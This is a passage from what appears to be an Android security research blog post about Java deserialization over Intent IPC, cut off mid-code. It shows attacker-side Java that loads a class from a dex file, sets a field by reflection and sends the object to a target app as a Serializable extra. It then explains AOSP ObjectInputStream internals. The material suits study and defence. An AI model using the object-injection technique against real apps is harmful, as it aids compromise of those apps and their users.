+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>File</span> <span class=n>dexFile</span> <span class=o>=</span> <span class=n>getFileFromRaw</span><span class=o>(</span><span class=n>R</span><span class=o>.</span><span class=na>raw</span><span class=o>.</span><span class=na>classes4</span><span class=o>,</span> <span class=s>&#34;classes_out.dex&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>DexClassLoader</span> <span class=n>dexClassLoader</span> <span class=o>=</span> <span class=k>new</span> <span class=n>DexClassLoader</span><span class=o>(</span><span class=n>dexFile</span><span class=o>.</span><span class=na>getAbsolutePath</span><span class=o>(),</span> <span class=kc>null</span><span class=o>,</span> <span class=kc>null</span><span class=o>,</span> <span class=kc>null</span><span class=o>);</span> <span class=c1>// [1]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=n>loadedClass</span> <span class=o>=</span> <span class=n>dexClassLoader</span><span class=o>.</span><span class=na>loadClass</span><span class=o>(</span><span class=s>&#34;com.example.serialized.receiver.CustomClass&#34;</span><span class=o>);</span> <span class=c1>// [2]
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>obj</span> <span class=o>=</span> <span class=n>loadedClass</span><span class=o>.</span><span class=na>newInstance</span><span class=o>();</span> <span class=c1>// [3]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=n>Field</span> <span class=n>f_att1</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=n>f_att1</span> <span class=o>=</span> <span class=n>loadedClass</span><span class=o>.</span><span class=na>getDeclaredField</span><span class=o>(</span><span class=s>&#34;att1&#34;</span><span class=o>)</span> <span class=c1>// [4]
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>f_att1</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
+</span></span><span class=line><span class=cl><span class=n>f_att1</span><span class=o>.</span><span class=na>set</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=n>1337</span><span class=o>);</span> <span class=c1>// [5]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=n>Intent</span> <span class=n>in</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Intent</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>in</span><span class=o>.</span><span class=na>putExtra</span><span class=o>(</span><span class=s>&#34;so&#34;</span><span class=o>,</span> <span class=o>(</span><span class=n>Serializable</span><span class=o>)</span> <span class=n>obj</span><span class=o>);</span> <span class=c1>// [6]
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>startActivity</span><span class=o>(</span><span class=n>in</span><span class=o>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>The code above shows how it is then possible to import the <code>classes.dex</code> file and instantiate a <code>DexClassLoader</code> [1] from it. The returned <code>ClassLoader</code> can be used to load the class [2] and subsequently instantiate the object through the <code>Object.newInstance()</code> method [3]. Class fields can be accessed and modified through the loaded class using the <code>getDeclaredField</code> method [4] and <code>Field.set</code> [5]. At the end of everything, it is just necessary to cast the input object to <code>Serializable</code> [6] in order to accomodate the <code>Intent.putExtra</code> logic.</p><p>Of course, this is not the only way to achieve this result, stealthier in-memory solutions or completely different alternatives (e.g. raw object bytes) might be possible as well but are not in the interest of this blog post.</p><a href=#internal-deserialization-process><h3 id=internal-deserialization-process><span class=hanchor arialabel=Anchor># </span>Internal deserialization process</h3></a><p>Once the object is received from the target application through IPC, the deserialized object is a just a series of bytes (a bunch of 0s and 1s that need to be interpreted, as everything in computer science) and the previously mentioned
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1389;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850" rel=noopener><code>ObjectInputStream::readFile0</code></a> is responsible for that, following the Java
+<a href=https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html rel=noopener>Object Serialization Stream Protocol</a> specification. As we have said, we are not going to deepen this process, but there are a few interesting things that are in our interest:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl>  <span class=kd>private</span> <span class=n>Object</span> <span class=nf>readObject0</span><span class=o>(</span><span class=kt>boolean</span> <span class=n>unshared</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>IOException</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>byte</span> <span class=n>tc</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=o>((</span><span class=n>tc</span> <span class=o>=</span> <span class=n>bin</span><span class=o>.</span><span class=na>peekByte</span><span class=o>())</span> <span class=o>==</span> <span class=n>TC_RESET</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// .. 
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>switch</span> <span class=o>(</span><span class=n>tc</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>TC_ENUM</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>checkResolve</span><span class=o>(</span><span class=n>readEnum</span><span class=o>(</span><span class=n>unshared</span><span class=o>));</span> 
+</span></span><span class=line><span class=cl>                <span class=k>case</span> <span class=n>TC_OBJECT</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>checkResolve</span><span class=o>(</span><span class=n>readOrdinaryObject</span><span class=o>(</span><span class=n>unshared</span><span class=o>));</span> <span class=c1>// [1]
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>			<span class=o>}</span>
+</span></span><span class=line><span class=cl>		<span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=kd>private</span> <span class=n>Object</span> <span class=nf>readOrdinaryObject</span><span class=o>(</span><span class=kt>boolean</span> <span class=n>unshared</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>        <span class=kd>throws</span> <span class=n>IOException</span>
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>ObjectStreamClass</span> <span class=n>desc</span> <span class=o>=</span> <span class=n>readClassDesc</span><span class=o>(</span><span class=kc>false</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span> <span class=o>=</span> <span class=n>desc</span><span class=o>.</span><span class=na>forClass</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>cl</span> <span class=o>==</span> <span class=n>String</span><span class=o>.</span><span class=na>class</span> <span class=o>||</span> <span class=n>cl</span> <span class=o>==</span> <span class=n>Class</span><span class=o>.</span><span class=na>class</span>
+</span></span><span class=line><span class=cl>                <span class=o>||</span> <span class=n>cl</span> <span class=o>==</span> <span class=n>ObjectStreamClass</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>InvalidClassException</span><span class=o>(</span><span class=s>&#34;invalid class descriptor&#34;</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=n>Object</span> <span class=n>obj</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>obj</span> <span class=o>=</span> <span class=n>desc</span><span class=o>.</span><span class=na>isInstantiable</span><span class=o>()</span> <span class=o>?</span> <span class=n>desc</span><span class=o>.</span><span class=na>newInstance</span><span class=o>()</span> <span class=o>:</span> <span class=kc>null</span><span class=o>;</span> <span class=c1>// [3]
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>ex</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=o>(</span><span class=n>IOException</span><span class=o>)</span> <span class=k>new</span> <span class=n>InvalidClassException</span><span class=o>(</span>
+</span></span><span class=line><span class=cl>                <span class=n>desc</span><span class=o>.</span><span class=na>forClass</span><span class=o>().</span><span class=na>getName</span><span class=o>(),</span>
+</span></span><span class=line><span class=cl>                <span class=s>&#34;unable to create instance&#34;</span><span class=o>).</span><span class=na>initCause</span><span class=o>(</span><span class=n>ex</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>Object</span> <span class=n>obj</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>        <span class=kd>final</span> <span class=kt>boolean</span> <span class=n>isRecord</span> <span class=o>=</span> <span class=n>desc</span><span class=o>.</span><span class=na>isRecord</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>isRecord</span><span class=o>)</span> <span class=o>{</span> <span class=c1>// [2]
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>assert</span> <span class=n>obj</span> <span class=o>==</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>            <span class=n>obj</span> <span class=o>=</span> <span class=n>readRecord</span><span class=o>(</span><span class=n>desc</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(!</span><span class=n>unshared</span><span class=o>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>handles</span><span class=o>.</span><span class=na>setObject</span><span class=o>(</span><span class=n>passHandle</span><span class=o>,</span> <span class=n>obj</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>desc</span><span class=o>.</span><span class=na>isExternalizable</span><span class=o>())</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>readExternalData</span><span class=o>((</span><span class=n>Externalizable</span><span class=o>)</span> <span class=n>obj</span><span class=o>,</span> <span class=n>desc</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>readSerialData</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=n>desc</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>handles</span><span class=o>.</span><span class=na>finish</span><span class=o>(</span><span class=n>passHandle</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>obj</span> <span class=o>!=</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>handles</span><span class=o>.</span><span class=na>lookupException</span><span class=o>(</span><span class=n>passHandle</span><span class=o>)</span> <span class=o>==</span> <span class=kc>null</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=n>desc</span><span class=o>.</span><span class=na>hasReadResolveMethod</span><span class=o>())</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>Object</span> <span class=n>rep</span> <span class=o>=</span> <span class=n>desc</span><span class=o>.</span><span class=na>invokeReadResolve</span><span class=o>(</span><span class=n>obj</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>obj</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>If the byte stream contains an object (<code>TC_OBJECT</code>),
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=1895;drc=7f1a1070dbdd1bda00223be2f21936f63a8f3850" rel=noopener><code>readOrdinaryObject</code></a> [2] is called and, after some validation steps, the object is instantiated through the the <code>.newInstance</code> method based on its type. The <code>.isInstantiable</code> is a good starting point to understand the logic behind the constructor selection:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kt>boolean</span> <span class=nf>isInstantiable</span><span class=o>()</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>requireInitialized</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=o>(</span><span class=n>cons</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>);</span> <span class=c1>//[1]
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>private</span> <span class=nf>ObjectStreamClass</span><span class=o>(</span><span class=kd>final</span> <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>externalizable</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>cons</span> <span class=o>=</span> <span class=n>getExternalizableConstructor</span><span class=o>(</span><span class=n>cl</span><span class=o>);</span> <span class=c1>// [2]
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>cons</span> <span class=o>=</span> <span class=n>getSerializableConstructor</span><span class=o>(</span><span class=n>cl</span><span class=o>);</span> <span class=c1>// [3]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>private</span> <span class=kd>static</span> <span class=n>Constructor</span><span class=o>&lt;?&gt;</span> <span class=n>getExternalizableConstructor</span><span class=o>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Constructor</span><span class=o>&lt;?&gt;</span> <span class=n>cons</span> <span class=o>=</span> <span class=n>cl</span><span class=o>.</span><span class=na>getDeclaredConstructor</span><span class=o>((</span><span class=n>Class</span><span class=o>&lt;?&gt;[])</span> <span class=kc>null</span><span class=o>);</span> <span class=c1>// [4]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>cons</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=o>((</span><span class=n>cons</span><span class=o>.</span><span class=na>getModifiers</span><span class=o>()</span> <span class=o>&amp;</span> <span class=n>Modifier</span><span class=o>.</span><span class=na>PUBLIC</span><span class=o>)</span> <span class=o>!=</span> <span class=n>0</span><span class=o>)</span> <span class=o>?</span> <span class=n>cons</span> <span class=o>:</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>private</span> <span class=kd>static</span> <span class=n>Constructor</span><span class=o>&lt;?&gt;</span> <span class=n>getSerializableConstructor</span><span class=o>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cl</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>initCl</span> <span class=o>=</span> <span class=n>cl</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Constructor</span><span class=o>&lt;?&gt;</span> <span class=n>cons</span> <span class=o>=</span> <span class=n>initCl</span><span class=o>.</span><span class=na>getDeclaredConstructor</span><span class=o>((</span><span class=n>Class</span><span class=o>&lt;?&gt;[])</span> <span class=kc>null</span><span class=o>);</span> <span class=c1>// [5]
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>mods</span> <span class=o>=</span> <span class=n>cons</span><span class=o>.</span><span class=na>getModifiers</span><span class=o>();</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>((</span><span class=n>mods</span> <span class=o>&amp;</span> <span class=n>Modifier</span><span class=o>.</span><span class=na>PRIVATE</span><span class=o>)</span> <span class=o>!=</span> <span class=n>0</span> <span class=o>||</span> <span class=o>((</span><span class=n>mods</span> <span class=o>&amp;</span> <span class=o>(</span><span class=n>Modifier</span><span class=o>.</span><span class=na>PUBLIC</span> <span class=o>|</span> <span class=n>Modifier</span><span class=o>.</span><span class=na>PROTECTED</span><span class=o>))</span> <span class=o>==</span> <span class=n>0</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>packageEquals</span><span class=o>(</span><span class=n>cl</span><span class=o>,</span> <span class=n>initCl</span><span class=o>)))</span>
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>cons</span><span class=o>.</span><span class=na>setAccessible</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cons</span><span class=o>;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>If we search for write references (from cs.android.com) to the <code>cons</code> variable [1], we can identify its definition in the <code>ObjectStreamClass</code> constructor [2][3]. Both
+<code>Externalizable</code> and <code>Serializable</code> interfaces are instantiated through a <code>public</code> (or also <code>protected</code> in case of <code>Serializable</code>) no-arg constructors [4][5]. In case of <code>Serializable</code> however, the returned constructor is the first non-serializable superclass.</p><p>Going back to the <code>readOrdinaryObject</code> shown above, an if/else condition dispatch the parsing method based on the received object class type.</p><a href=#readserialdata><h4 id=readserialdata><span class=hanchor arialabel=Anchor># </span><code>readSerialData</code></h4></a><p>Starting from the already known <code>Serializable</code> interface, let&rsquo;s see a trimmed version of the code responsible to handle this type of objects from the
+<a href="https://cs.android.com/android/platform/superproject/main/+/main:libcore/ojluni/src/main/java/java/io/ObjectInputStream.java;l=2063;drc=60545d5caebd2d51949000994964458249a234c3" rel=noopener><code>ObjectInputStream::readSerialData</code></a> method:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=kt>void</span> <span class=nf>readSerialData</span><span class=o>(</span><span class=n>Object</span> <span class=n>obj</span><span class=o>,</span> <span class=n>ObjectStreamClass</span> <span class=n>desc</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>IOException</span>        
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>ObjectStreamClass</span><span class=o>.</span><span class=na>ClassDataSlot</span><span class=o>[]</span> <span class=n>slots</span> <span class=o>=</span> <span class=n>desc</span><span class=o>.</span><span class=na>getClassDataLayout</span><span class=o>();</span> <span class=c1>// [1]
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>slots</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=n>i</span><span class=o>++)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>ObjectStreamClass</span> <span class=n>slotDesc</span> <span class=o>=</span> <span class=n>slots</span><span class=o>[</span><span class=n>i</span><span class=o>].</span><span class=na>desc</span><span class=o>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=o>(</span><span class=n>slots</span><span class=o>[</span><span class=n>i</span><span class=o>].</span><span class=na>hasData</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>obj</span> <span class=o>==</span> <span class=kc>null</span> <span class=o>||</span> <span class=n>handles</span><span class=o>.</span><span class=na>lookupException</span><span class=o>(</span><span class=n>passHandle</span><span class=o>)</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=n>defaultReadFields</span><span class=o>(</span><span class=kc>null</span><span class=o>,</span> <span class=n>slotDesc</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>                <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>slotDesc</span><span class=o>.</span><span class=na>hasReadObjectMethod</span><span class=o>())</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>slotDesc</span><span class=o>.</span><span class=na>invokeReadObject</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=k>this</span><span class=o>);</span> <span class=c1>// [1]
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=n>defaultReadFields</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=n>slotDesc</span><span class=o>);</span>
+</span></span><span class=line><span class=cl>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=cm>/* .. */</span> <span class=o>&amp;&amp;</span> <span class=n>slotDesc</span><span class=o>.</span><span class=na>hasReadObjectNoDataMethod</span><span class=o>())</span>
+</span></span><span class=line><span class=cl>                <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=n>slotDesc</span><span class=o>.</span><span class=na>invokeReadObjectNoData</span><span class=o>(</span><span class=n>obj</span><span class=o>);</span> <span class=c1>// [2]
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>invokeReadObject</span><span class=o>(</span><span class=n>Object</span> <span class=n>obj</span><span class=o>,</span> <span class=n>ObjectInputStream</span> <span class=n>in</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>ClassNotFoundException</span><span class=o>,</span> <span class=n>IOException</span><span class=o>,</span> <span class=n>UnsupportedOperationException</span>
+</span></span><span class=line><span class=cl>	<span class=o>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=o>(</span><span class=n>readObjectMethod</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>			<span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=n>readObjectMethod</span><span class=o>.</span><span class=na>invoke</span><span class=o>(</span><span class=n>obj</span><span class=o>,</span> <span class=k>new</span> <span class=n>Object</span><span class=o>[]{</span> <span class=n>in</span> <span class=o>});</span> <span class=c1>//[3]
+</span></span></span><span class=line><span class=cl><span class=c1></span>			<span class=c1>// ..
+</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The object needs to be deserialized from the superclass to subclasses, hence these are obtained through <code>getClassDataLayout</code> [1] and looped. Inside the <code>for</code> loop we can identify two interesting invocations: <code>.invokeReadObject</code> [1] and <code>.invokeReadObjectNoData</code> [2]. These two methods are responsible to call the respective <code>readObject</code> or <code>readObjectNoData</code> methods <strong>if</strong> they are defined in the serialized class through reflection [3].</p><a href=#readexternaldata><h4 id=readexternaldata><span class=hanchor arialabel=Anchor># </span><code>readExternalData</code></h4></a><p>The <code>readExternalData</code> method is instead responsible to handle
+<a href=https://developer.android.com/reference/java/io/Externalizable rel=noopener><code>Externalizable</code></a> interfaces:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span> <span class=kt>void</span> <span class=nf>readExternalData</span><span class=o>(</span><span class=n>Externalizable</span> <span class=n>obj</span><span class=o>,</span> <span class=n>ObjectStreamClass</span> <span class=n>desc</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>IOException</span>
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
